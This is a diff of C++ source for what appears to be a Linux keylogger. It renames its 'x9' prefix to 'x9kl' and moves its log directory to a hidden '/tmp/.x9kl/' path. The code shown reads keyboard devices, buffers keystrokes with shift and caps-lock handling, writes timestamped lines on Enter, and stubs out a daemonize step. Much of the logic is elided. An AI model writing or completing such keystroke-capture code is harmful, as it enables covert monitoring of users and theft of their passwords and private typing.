@@ -16,9 +16,9 @@
 #include <string>
 #include <vector>
 
-#define LOGS_DIRECTORY "/tmp/.x9/"
+#define LOGS_DIRECTORY "/tmp/.x9kl/"
 
-struct x9_ctx_t {
+struct x9kl_ctx_t {
   bool is_capslock_on;
   bool is_shift_pressed;
   std::vector<int> kb_fds;
@@ -30,16 +30,16 @@ struct x9_ctx_t {
 struct key_event_handler_t {
   char key_char;
   char key_char_shift;
-  void (*cb)(x9_ctx_t *);
+  void (*cb)(x9kl_ctx_t *);
 };
 
-void handle_key(x9_ctx_t *);
-void handle_enter(x9_ctx_t *);
-void handle_backspace(x9_ctx_t *);
-void handle_capslock(x9_ctx_t *);
-void handle_delete(x9_ctx_t *);
-void handle_arrow(x9_ctx_t *);
-void handle_shift(x9_ctx_t *);
+void handle_key(x9kl_ctx_t *);
+void handle_enter(x9kl_ctx_t *);
+void handle_backspace(x9kl_ctx_t *);
+void handle_capslock(x9kl_ctx_t *);
+void handle_delete(x9kl_ctx_t *);
+void handle_arrow(x9kl_ctx_t *);
+void handle_shift(x9kl_ctx_t *);
 
 volatile std::sig_atomic_t must_stop{0};
 
@@ -136,12 +136,12 @@ std::vector<int> get_keyboard_fds() {
   return fds;
 }
 
-int initialize_ctx(x9_ctx_t *ctx) {
+int initialize_ctx(x9kl_ctx_t *ctx) {
   if (!ctx) {
     return 1;
   }
 
-  std::memset(ctx, 0, sizeof(x9_ctx_t));
+  std::memset(ctx, 0, sizeof(x9kl_ctx_t));
 
   ctx->is_capslock_on = false;
   ctx->buffer_cursor = 0;
@@ -156,13 +156,13 @@ int initialize_ctx(x9_ctx_t *ctx) {
   return 0;
 }
 
-void destroy_ctx(x9_ctx_t *ctx) {
+void destroy_ctx(x9kl_ctx_t *ctx) {
   for (auto &fd : ctx->kb_fds) {
     close(fd);
   }
 }
 
-void handle_key(x9_ctx_t *ctx) {
+void handle_key(x9kl_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -179,7 +179,7 @@ void handle_key(x9_ctx_t *ctx) {
                         key_char);
 }
 
-void handle_enter(x9_ctx_t *ctx) {
+void handle_enter(x9kl_ctx_t *ctx) {
   char date[11], timestamp[9];
 
   if (!ctx->event.value || ctx->kb_buffer.empty()) {
@@ -206,7 +206,7 @@ void handle_enter(x9_ctx_t *ctx) {
   ctx->buffer_cursor = 0;
 }
 
-void handle_capslock(x9_ctx_t *ctx) {
+void handle_capslock(x9kl_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -214,11 +214,11 @@ void handle_capslock(x9_ctx_t *ctx) {
   ctx->is_capslock_on = !ctx->is_capslock_on;
 }
 
-void handle_shift(x9_ctx_t *ctx) {
+void handle_shift(x9kl_ctx_t *ctx) {
   ctx->is_shift_pressed = ctx->event.value;
 }
 
-void handle_delete(x9_ctx_t *ctx) {
+void handle_delete(x9kl_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -228,7 +228,7 @@ void handle_delete(x9_ctx_t *ctx) {
   }
 }
 
-void handle_backspace(x9_ctx_t *ctx) {
+void handle_backspace(x9kl_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -238,7 +238,7 @@ void handle_backspace(x9_ctx_t *ctx) {
   }
 }
 
-void handle_arrow(x9_ctx_t *ctx) {
+void handle_arrow(x9kl_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -249,7 +249,7 @@ void handle_arrow(x9_ctx_t *ctx) {
                                                  : (ctx->buffer_cursor + 1);
 }
 
-void run(x9_ctx_t *ctx) {
+void run(x9kl_ctx_t *ctx) {
   struct input_event ev;
   fd_set rfds;
 
@@ -291,7 +291,7 @@ void run(x9_ctx_t *ctx) {
 void deamonize() {}
 
 int main() {
-  x9_ctx_t ctx;
+  x9kl_ctx_t ctx;
 
   if (initialize_ctx(&ctx)) {
     std::exit(EXIT_FAILURE);
